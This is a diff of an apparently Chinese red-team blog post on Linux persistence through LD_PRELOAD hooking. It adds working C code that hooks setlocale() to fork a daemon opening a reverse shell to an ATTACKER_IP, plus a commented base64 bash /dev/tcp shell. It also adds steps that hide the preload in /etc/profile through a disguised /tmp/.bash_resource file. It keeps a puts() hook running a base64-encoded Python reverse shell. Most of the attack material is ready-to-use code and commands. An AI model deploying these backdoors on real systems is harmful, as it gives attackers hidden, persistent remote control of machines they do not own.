@@ -35,6 +35,11 @@
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220112005341592.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220110113627792.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220618205837.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914113703103.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914114528675.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914213041258.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914213156653.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220915104942827.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220110162326863.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220111092529335.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220110180237753.png">
@@ -42,7 +47,7 @@
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220111100443610.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220111100524504.png">
 <meta property="article:published_time" content="2022-01-10T01:32:18.000Z">
-<meta property="article:modified_time" content="2022-06-18T13:00:11.870Z">
+<meta property="article:modified_time" content="2022-09-15T08:39:26.352Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="权限维持">
 <meta property="article:tag" content="红队">
@@ -303,7 +308,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3.5k</span>Reading time: <span class="post-count reading-time">15 min</span></span>
+                        <span>Word count: <span class="post-count word-count">4.5k</span>Reading time: <span class="post-count reading-time">20 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -602,22 +607,88 @@ height:50vh;
 
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220110112241188.png" alt="image-20220110112241188"></p>
 <p>准备payload.c</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//创建新函数new_puts</span></span><br><span class="line">  <span class="keyword">int</span> (*new_puts)(<span class="keyword">const</span> <span class="keyword">char</span> *message);</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">   <span class="comment">//把原函数指针赋值给new_puts</span></span><br><span class="line">  new_puts = dlsym(RTLD_NEXT, <span class="string">&quot;puts&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;python3 -c \&quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;UTF-8&#x27;)&#125;[sys.version_info[0]](&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTcyLjE3LjAuMSIsIDY2NjYpKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp&#x27;)))\&quot;&quot;</span>);</span><br><span class="line">  <span class="comment">//调用新函数</span></span><br><span class="line">  result = new_puts(message);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//创建新函数new_puts</span></span><br><span class="line">  <span class="keyword">int</span> (*new_puts)(<span class="keyword">const</span> <span class="keyword">char</span> *message);</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">   <span class="comment">//把原函数指针赋值给new_puts</span></span><br><span class="line">  new_puts = dlsym(RTLD_NEXT, <span class="string">&quot;puts&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;python3 -c \&quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;UTF-8&#x27;)&#125;[sys.version_info[0]](&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTcyLjE3LjAuMSIsIDY2NjYpKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp&#x27;)))\&quot;&quot;</span>);</span><br><span class="line">  <span class="comment">//调用新函数</span></span><br><span class="line">  result = new_puts(message);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>dlsym函数用于从一个共享对象或可执行对象中包含一个符号所对应的地址,编译时需要指定<code>-ldl</code>参数，参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Cxinsect/article/details/100761916">https://blog.csdn.net/Cxinsect/article/details/100761916</a></p>
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220112005232112.png" alt="image-20220112005232112"></p>
 <p>其中<code>RTLD_NEXT</code>handle用于从共享库中获取真正的函数，当有多个同名函数被preloading的时候</p>
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220112005341592.png" alt="image-20220112005341592"></p>
-<p>python代码如下:</p>
+<p>如下头文件是dlsym必须的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br></pre></td></tr></table></figure>
+
+<p>python代码解码如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line"><span class="keyword">if</span> ret &gt; <span class="number">0</span>:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&quot;172.17.0.1&quot;</span>, <span class="number">6666</span>))</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">        p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
 
 <p>编译共享库so</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o payload.so -D_GNU_SOURCE -ldl payload.c</span><br><span class="line">&#x2F;&#x2F;-ldl参数是必须的，原因是使用了dlsym对puts进行了重写</span><br><span class="line">export LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;payload.so</span><br><span class="line">&#x2F;&#x2F;添加LD_PRELOAD环境变量</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;-ldl参数是必须的，原因是使用了dlsym对puts进行了重写</span><br><span class="line">gcc -shared -fPIC -o payload.so -D_GNU_SOURCE -ldl payload.c</span><br><span class="line">&#x2F;&#x2F;添加LD_PRELOAD环境变量</span><br><span class="line">export LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;payload.so</span><br></pre></td></tr></table></figure>
 
 <p>执行命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220110113627792.png" alt="image-20220110113627792"></p>
+<h3 id="直接修改函数"><a href="#直接修改函数" class="headerlink" title="直接修改函数"></a>直接修改函数</h3><p>这种方式虽然简单，但是也破坏了原有的函数，容易暴露</p>
+<p>jaky.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;jaky.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">int main()&#123;  </span><br><span class="line">	srand(time(NULL));</span><br><span class="line">	return 0;</span><br><span class="line">	&#125;</span><br><span class="line">&#x2F;&#x2F;编译：gcc -o jaky jaky.c</span><br></pre></td></tr></table></figure>
+
+<p>动态链接库jakylib.so</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;jakylib.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int time()&#123;    </span><br><span class="line">    printf(&quot;hello Jaky&quot;);</span><br><span class="line">    return 0; &#x2F;&#x2F;the most random number in the universe</span><br><span class="line">&#125;&#x2F;&#x2F;编译：gcc -shared -fPIC jakylib.c -o jakylib.so</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;jakylib.so .&#x2F;jaky</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造函数attribute调用"><a href="#构造函数attribute调用" class="headerlink" title="构造函数attribute调用"></a>构造函数attribute调用</h3><p><strong>GCC</strong> 有个 C 语言扩展修饰符 <strong><strong>attribute</strong>((constructor))**，可以让由它修饰的函数在 **main()</strong> 之前执行，一旦某些指令需要加载<strong>动态链接库</strong>时，就会立即执行它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//last.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am hacker!!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;id&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220618205837.png" alt="微信图片_20220618205837"></p>
+<h3 id="插桩式后门"><a href="#插桩式后门" class="headerlink" title="插桩式后门"></a>插桩式后门</h3><blockquote>
+<p>插桩式后门能够hook指定函数，只要命令调用中包含指定函数就会触发，隐蔽性也好</p>
+<p>缺点是花费时间多</p>
+</blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://tbrindus.ca/correct-ld-preload-hooking-libc/">https://tbrindus.ca/correct-ld-preload-hooking-libc/</a></p>
+<p>下载<a target="_blank" rel="noopener" href="http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/glibc_2.31.orig.tar.xz">glibc源码</a></p>
+<p>观察fopen实现代码</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914113703103.png" alt="image-20220914113703103"></p>
+<p>构造poc</p>
+<p>fopen.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line"></span><br><span class="line">typedef FILE *(*fopen_t)(const char *pathname, const char *mode);</span><br><span class="line">fopen_t real_fopen;</span><br><span class="line"></span><br><span class="line">FILE *fopen(const char *pathname, const char *mode) &#123;</span><br><span class="line">  fprintf(stderr, &quot;called fopen(%s, %s)\n&quot;, pathname, mode);</span><br><span class="line">  if (!real_fopen) &#123;</span><br><span class="line">    real_fopen &#x3D; dlsym(RTLD_NEXT, &quot;fopen&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return real_fopen(pathname, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) static void setup(void) &#123;</span><br><span class="line">  fprintf(stderr, &quot;called setup()\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC fopen.c -ldl -D_GNU_SOURCE -o fopen.so</span><br><span class="line">LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;fopen.so ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914114528675.png" alt="image-20220914114528675"></p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>总结来看插桩式后门效果最好，无声无息且不影响原有程序的可用性，就自己做一个。</p>
+<p>问了一圈运维常用命令，想来个通杀的函数Hook，但是每个人的习惯都不太一样，然后手动ltrace发现比起打开文件的<code>fopen</code>更常见的<code>setlocale</code>函数用于设置输出时的编码</p>
+<p>more</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914213041258.png" alt="image-20220914213041258"></p>
+<p>连ssh都有</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220914213156653.png" alt="image-20220914213156653"></p>
+<p>那就做一个吧，成果如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKER_IP <span class="meta-string">&quot;192.168.119.164&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKER_PORT 15638</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> *(*<span class="keyword">setlocale_t</span>)(<span class="keyword">int</span> category, <span class="keyword">const</span> <span class="keyword">char</span> *locale);</span><br><span class="line"><span class="keyword">setlocale_t</span> real_setlocale;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">setlocale</span><span class="params">(<span class="keyword">int</span> category, <span class="keyword">const</span> <span class="keyword">char</span> *locale)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// fprintf(stderr, &quot;called setlocale(%d, %s)\n&quot;, category, locale);</span></span><br><span class="line">	<span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">int</span> nochdir = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> noclose = <span class="number">0</span>;</span><br><span class="line">	daemon(nochdir, noclose);  </span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">	    sa.sin_family = AF_INET;</span><br><span class="line">	    sa.sin_port = htons(ATTACKER_PORT);</span><br><span class="line">	    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);</span><br><span class="line">	    <span class="keyword">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	    <span class="keyword">if</span> (connect(sockt, (struct sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa)) != <span class="number">0</span>) &#123;</span><br><span class="line">	    	<span class="comment">//printf(&quot;Segmentation fault&quot;);</span></span><br><span class="line">	        <span class="comment">// printf(&quot;[ERROR] connection failed.\n&quot;);</span></span><br><span class="line">	        <span class="keyword">return</span> <span class="string">&quot;en_US.UTF-8&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">	    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">	    dup2(sockt, <span class="number">2</span>);</span><br><span class="line">	    <span class="keyword">char</span> *<span class="keyword">const</span> argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="comment">// system(&quot;echo &#x27;YmFzaCAtaSAmPi9kZXYvdGNwLzE4Mi4xNjAuOS4zNS8xNTYzOCA8JjE=&#x27;|base64 -d|bash -i&quot;);</span></span><br><span class="line">  </span><br><span class="line">	&#125;</span><br><span class="line">		<span class="keyword">if</span> (!real_setlocale) &#123;</span><br><span class="line">	    real_setlocale = dlsym(RTLD_NEXT, <span class="string">&quot;setlocale&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span> real_setlocale(category, locale);</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ATTACKER_IP为反弹ip</li>
+<li>ATTACKER_PORT为反弹端口</li>
+<li>通过fork()创建子进程再创建守护进程反弹shell，不影响正常命令执行</li>
+</ul>
+<p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -ldl -D_GNU_SOURCE -o setlocale.so setlocale.c</span><br></pre></td></tr></table></figure>
+
+<p>生成setlocate.so文件进行<code>LD_PRELOAD</code>动态链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;setlocate.so whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220915104942827.png" alt="image-20220915104942827"></p>
+<p>最后可以通过将<code>LD_PRELOAD</code>写入在<code>/etc/profile</code>等配置文件中进行持久化维权</p>
+<p>在/etc/profile中写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># System global API definition</span><br><span class="line">if [ -f &#x2F;tmp&#x2F;.bash_resource ]; then</span><br><span class="line">        . &#x2F;tmp&#x2F;.bash_resource</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>在/tmp/.bash_resource中写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;setlocale.so</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://tbrindus.ca/correct-ld-preload-hooking-libc/">Correct usage of <code>LD_PRELOAD</code> for hooking <code>libc</code> functions</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.izenynn.com/2022/04/02/create-a-simple-reverse-shell-in-c-c/">Create a simple reverse shell in C/C++</a></li>
+</ol>
 <h3 id="隐藏后门"><a href="#隐藏后门" class="headerlink" title="隐藏后门"></a>隐藏后门</h3><p>显示环境变量的命令主要有以下几种</p>
 <ul>
 <li>echo $LD_PRELOAD </li>
@@ -633,12 +704,8 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;profile</span><br><span class="line">&#x2F;etc&#x2F;bashrc</span><br><span class="line">~&#x2F;.bashrc</span><br><span class="line">~&#x2F;.bash_profile</span><br><span class="line">~&#x2F;.bash_login</span><br><span class="line">~&#x2F;.bash_logout</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>也可以根据alias后门中的方法一样，卸载配置文件中引用的其他配置文件中，增强隐蔽性。</li>
+<li>也可以根据alias后门中的方法一样，嵌入在配置文件中引用的其他配置文件中，增强隐蔽性。</li>
 </ul>
-<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p><strong>GCC</strong> 有个 C 语言扩展修饰符 <strong><strong>attribute</strong>((constructor))**，可以让由它修饰的函数在 **main()</strong> 之前执行，一旦某些指令需要加载动态链接库时，就会立即执行它。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//last.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am hacker!!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;id&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220618205837.png" alt="微信图片_20220618205837"></p>
 <h2 id="Issues"><a href="#Issues" class="headerlink" title="Issues"></a>Issues</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1835020">https://cloud.tencent.com/developer/article/1835020</a></p>
 <p>这篇文章的作者在遇到了这种匪夷所思的问题的时候竟然花了一年时间来学c、汇编语言，换我直接跳过了，太牛了，学习学习。记录下文章中的几个操作。</p>
